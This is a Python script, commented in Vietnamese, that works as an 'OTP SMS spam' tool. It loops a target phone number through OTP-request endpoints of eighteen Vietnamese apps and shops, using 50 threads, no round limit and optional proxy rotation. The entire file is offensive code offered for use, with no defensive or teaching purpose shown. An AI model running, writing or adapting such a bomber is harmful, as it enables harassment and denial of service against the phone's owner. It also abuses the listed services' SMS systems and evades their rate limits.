import requests
import threading
import time
import random
import string
import json
import sys
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIG
# ============================================================
TARGET_PHONE = "09xxxxxxxxx"  # Thay số điện thoại mục tiêu tại đây
THREAD_COUNT = 50              # Số luồng chạy đồng thời
SPAM_COUNT   = 0               # 0 = vô hạn, >0 = số lần gửi mỗi dịch vụ
DELAY_BETWEEN_ROUNDS = 0.1     # Độ trễ giữa các vòng lặp (giây)
TIMEOUT = 10                   # Timeout HTTP request (giây)

# ============================================================
# PROXY (tùy chọn – nếu có proxy list thì bật lên)
# ============================================================
USE_PROXY = False
PROXY_LIST = []  # Điền proxy dạng "http://ip:port" hoặc "socks5://ip:port"

# ============================================================
# HEADERS GIẢ LẬP
# ============================================================
HEADERS_MOBILE = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "null",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

def get_proxy():
    """Trả về proxy ngẫu nhiên nếu USE_PROXY=True"""
    if USE_PROXY and PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": proxy, "https": proxy}
    return None

# ============================================================
# MODULE GỬI OTP – MỖI HÀM TRẢ VỀ (tên_dịch_vụ, thành_công, phản_hồi)
# ============================================================

# ---------- MOMO ----------
def send_momo(phone):
    url = "https://api.momo.vn/otp/send"
    payload = {"phone": phone, "type": "REGISTER"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("MOMO", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("MOMO", False, str(e))

# ---------- VIETTEL MONEY ----------
def send_viettel_money(phone):
    url = "https://api.viettelpay.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("VIETTEL_MONEY", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("VIETTEL_MONEY", False, str(e))

# ---------- VINFANS ----------
def send_vinfans(phone):
    url = "https://api.vinfans.vn/api/send_otp"
    payload = {"phone_number": phone, "otp_type": "REGISTER"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("VINFANS", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("VINFANS", False, str(e))

# ---------- AEON ----------
def send_aeon(phone):
    url = "https://api.aeon.vn/api/v1/auth/send-otp"
    payload = {"mobile": phone}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("AEON", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("AEON", False, str(e))

# ---------- PHUCLONG ----------
def send_phuclong(phone):
    url = "https://api.phuclong.com.vn/api/otp"
    payload = {"phone": phone, "action": "signup"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("PHUCLONG", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("PHUCLONG", False, str(e))

# ---------- MY VIETTEL ----------
def send_my_viettel(phone):
    url = "https://api.myviettel.vn/api/v1/send_otp"
    payload = {"phone": phone, "platform": "APP"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("MY_VIETTEL", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("MY_VIETTEL", False, str(e))

# ---------- VHOME ----------
def send_vhome(phone):
    url = "https://api.vhome.vn/api/v1/send_otp"
    payload = {"phone": phone, "type": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("VHOME", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("VHOME", False, str(e))

# ---------- VUIHOC ----------
def send_vuihoc(phone):
    url = "https://api.vuihoc.vn/api/auth/otp"
    payload = {"phone": phone, "action": "SIGNUP"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("VUIHOC", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("VUIHOC", False, str(e))

# ---------- KINGFOLD ----------
def send_kingfold(phone):
    url = "https://api.kingfold.vn/api/v1/otp"
    payload = {"phone": phone, "type": "REGISTER"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("KINGFOLD", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("KINGFOLD", False, str(e))

# ---------- TV360 ----------
def send_tv360(phone):
    url = "https://api.tv360.vn/api/v1/auth/send_otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("TV360", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("TV360", False, str(e))

# ---------- FPT SHOP ----------
def send_fpt_shop(phone):
    url = "https://api.fptshop.com.vn/api/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("FPT_SHOP", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("FPT_SHOP", False, str(e))

# ---------- TIKI ----------
def send_tiki(phone):
    url = "https://api.tiki.vn/api/v2/otp/send"
    payload = {"phone": phone, "type": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("TIKI", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("TIKI", False, str(e))

# ---------- LAZADA ----------
def send_lazada(phone):
    url = "https://api.lazada.vn/api/v1/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("LAZADA", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("LAZADA", False, str(e))

# ---------- SHOPEE ----------
def send_shopee(phone):
    url = "https://api.shopee.vn/api/v1/send_otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("SHOPEE", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("SHOPEE", False, str(e))

# ---------- BAEMIN ----------
def send_baemin(phone):
    url = "https://api.baemin.vn/api/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("BAEMIN", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("BAEMIN", False, str(e))

# ---------- GRAB ----------
def send_grab(phone):
    url = "https://api.grab.com/v1/otp"
    payload = {"phone": phone, "countryCode": "VN"}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("GRAB", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("GRAB", False, str(e))

# ---------- GOJEK ----------
def send_gojek(phone):
    url = "https://api.gojek.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("GOJEK", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("GOJEK", False, str(e))

# ---------- ZALO PAY ----------
def send_zalopay(phone):
    url = "https://api.zalopay.vn/v2/otp/send"
    payload = {"phone": phone}
    try:
        r = requests.post(url, json=payload, headers=HEADERS_MOBILE,
                         proxies=get_proxy(), timeout=TIMEOUT)
        return ("ZALOPAY", r.status_code == 200, r.text[:100])
    except Exception as e:
        return ("ZALOPAY", False, str(e))

# ============================================================
# DANH SÁCH TẤT CẢ CÁC DỊCH VỤ
# ============================================================
SERVICES = [
    send_momo,
    send_viettel_money,
    send_vinfans,
    send_aeon,
    send_phuclong,
    send_my_viettel,
    send_vhome,
    send_vuihoc,
    send_kingfold,
    send_tv360,
    send_fpt_shop,
    send_tiki,
    send_lazada,
    send_shopee,
    send_baemin,
    send_grab,
    send_gojek,
    send_zalopay,
]

# ============================================================
# BỘ ĐẾM THÀNH CÔNG / THẤT BẠI
# ============================================================
success_count = {}
fail_count = {}

def worker(service_func, phone):
    """Hàm chạy trong từng luồng"""
    name, ok, resp = service_func(phone)
    if ok:
        success_count[name] = success_count.get(name, 0) + 1
    else:
        fail_count[name] = fail_count.get(name, 0) + 1
    return (name, ok)

def print_stats(round_num):
    """In thống kê sau mỗi vòng"""
    total_success = sum(success_count.values())
    total_fail = sum(fail_count.values())
    print(f"\n[VÒNG {round_num}] Tổng: {total_success} thành công / {total_fail} thất bại")
    for s in SERVICES:
        name = s.__name__.replace("send_", "").upper()
        sc = success_count.get(name, 0)
        fc = fail_count.get(name, 0)
        status = "✓" if sc > fc else "✗"
        print(f"  [{status}] {name}: OK={sc} FAIL={fc}")

def main():
    print("=" * 60)
    print("  TOOL SPAM OTP SMS – ĐA DỊCH VỤ VIỆT NAM")
    print(f"  MỤC TIÊU: {TARGET_PHONE}")
    print(f"  SỐ LUỒNG: {THREAD_COUNT}")
    print(f"  SỐ DỊCH VỤ: {len(SERVICES)}")
    print("=" * 60)

    if not TARGET_PHONE.startswith("0") or len(TARGET_PHONE) < 10:
        print("[!] Số điện thoại không hợp lệ! Phải bắt đầu bằng 0 và >=10 số.")
        return

    round_num = 0
    try:
        while True:
            round_num += 1
            if SPAM_COUNT > 0 and round_num > SPAM_COUNT:
                break

            with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
                futures = []
                for service_func in SERVICES:
                    f = executor.submit(worker, service_func, TARGET_PHONE)
                    futures.append(f)
                for _ in as_completed(futures):
                    pass

            print_stats(round_num)
            time.sleep(DELAY_BETWEEN_ROUNDS)

    except KeyboardInterrupt:
        print("\n[!] Đã dừng bởi người dùng. Thống kê cuối cùng:")
        print_stats(round_num)
        print("[*] Thoát.")

if __name__ == "__main__":
    main()
